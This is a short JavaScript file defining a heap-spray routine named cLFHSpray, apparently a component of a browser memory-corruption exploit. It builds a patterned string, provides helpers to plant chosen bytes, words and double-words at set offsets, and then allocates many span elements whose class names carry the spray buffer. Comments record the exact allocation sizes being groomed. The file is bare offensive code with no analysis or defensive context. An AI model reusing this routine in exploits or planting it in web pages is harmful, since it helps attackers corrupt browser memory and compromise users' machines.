function cLFHSpray(uCount, uSize) {
  this.aoElements = new Array(uCount);
  var auSprayChars = new Array(uSize - 1 >> 1);
  for (var i = 0; i < auSprayChars.length; i++) {
    auSprayChars[i] = ((i & 0xFF) * 0x202 + 0x100) & 0xFFFF;
  }
  this.setDWord = function(uOffset, uValue) {
    this.setWord(uOffset, uValue & 0xFFFF);
    this.setWord(uOffset + 2, uValue >>> 16);
  }
  this.setWord = function(uOffset, uValue) {
    this.setByte(uOffset, uValue & 0xFF);
    this.setByte(uOffset + 1, uValue >>> 8);
  }
  this.setByte = function(uOffset, uValue) {
    var uCharOffset = uOffset >> 1;
    var uByte0 = (uOffset & 1 ? auSprayChars[uCharOffset] : uValue) & 0xFF;
    var uByte1 = (uOffset & 1 ? uValue : (auSprayChars[uCharOffset] >> 8)) & 0xFF;
    auSprayChars[uCharOffset] = uByte0 + (uByte1 << 8);
  }
  this.spray = function() {
    var sSprayBuffer = String.fromCharCode.apply(0, auSprayChars);
    for (var i = 0; i < uCount; i++) {
      this.aoElements[i] = document.createElement("span"); // allocate 0x34 bytes
      this.aoElements[i].className = sSprayBuffer; // allocate 0x10, uSize and 0x40 bytes.
    }
  }
}
